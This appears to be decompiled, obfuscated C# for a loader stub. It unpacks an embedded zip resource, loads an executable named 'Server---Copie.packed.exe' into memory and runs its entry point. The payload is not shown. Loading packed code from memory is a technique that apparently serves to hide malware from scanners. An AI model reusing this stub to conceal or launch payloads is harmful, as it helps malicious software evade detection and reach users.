using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using System.Windows.Forms;

namespace ns0;

internal static class Class0
{
	private static Assembly smethod_0(Package p, string u)
	{
		Uri uri = new Uri(u, UriKind.Relative);
		byte[] array;
		using (Stream stream = p.GetPart(uri).GetStream())
		{
			array = new byte[(int)stream.Length];
			stream.Read(array, 0, array.Length);
		}
		Assembly assembly = Assembly.Load(array);
		if ((object)assembly == null)
		{
			throw new ArgumentException("Unable to load assembly: " + u);
		}
		return assembly;
	}

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			using Stream stream = typeof(Class0).Assembly.GetManifestResourceStream("a.zip");
			Package val = Package.Open(stream, FileMode.Open, FileAccess.Read);
			try
			{
				Assembly assembly = smethod_0(val, "/Server---Copie.packed.exe");
				assembly.EntryPoint!.Invoke(null, new object[1] { args });
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.GetType().Name + "\n" + ex.Message + "\n" + ex.StackTrace);
		}
	}
}
